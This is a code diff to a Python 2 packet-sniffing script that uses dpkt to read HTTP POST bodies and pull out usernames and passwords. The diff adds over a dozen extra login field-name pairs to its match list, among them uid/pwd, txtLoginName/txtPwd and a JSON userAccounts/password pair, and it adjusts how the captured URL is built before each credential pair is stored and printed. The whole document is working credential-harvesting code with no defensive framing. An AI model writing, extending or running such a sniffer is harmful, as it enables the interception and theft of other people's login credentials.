@@ -31,7 +31,19 @@ lists=[('u=','&p='),
     ('txtUsername=', '&txtPassword='),
     ('UserNameTemp=', '&PassWordTemp='),
     ('UserName=', '&PassWord='),
-
+    ('tbxUserName=','&tbxPassword='),
+    ('userName=','&password='),
+    ('id=','&password='),
+    ('uid=','&pwd='),
+    ('txtLoginName=','&txtPwd='),
+    ('userName=','&pwd='),
+    ('uname=','&pwd='),
+    ('txtUserCode=','&txtPassword='),
+    ('"userAccounts":',',"password":'),
+    ('UserNameTextBox=','&PasswordTextBox='),
+    ('txtAdminName=','&txtPassword='),
+    ('uName=','&uPwd='),
+    ('UserName=','&pwd='),
 ]
 
 
@@ -93,14 +105,14 @@ def monitor():
                 request = dpkt.http.Request(tcp.data)
             except (dpkt.dpkt.NeedData, dpkt.dpkt.UnpackError):
                 continue
-            if request.headers.get('host','') and request.uri:
-                url='http://'+request.headers.get('host','0.0.0.0')+str(request.uri)
+            if request.headers.get('host','') and request.uri:               
                 if request.method == 'POST':
                     data= request.body
                     for key,value in lists:
                         info=re.compile(r'%s(.*?)%s(.*?)($|&)'% (key,value))
                         result=info.match(data)
                         if result:
+                            url = 'http://' + request.headers.get('host', '') + request.uri
                             insert_info(url, result.group(1), result.group(2))
                             print url,' '*(70-len(url)),result.group(1),'/',result.group(2)
 
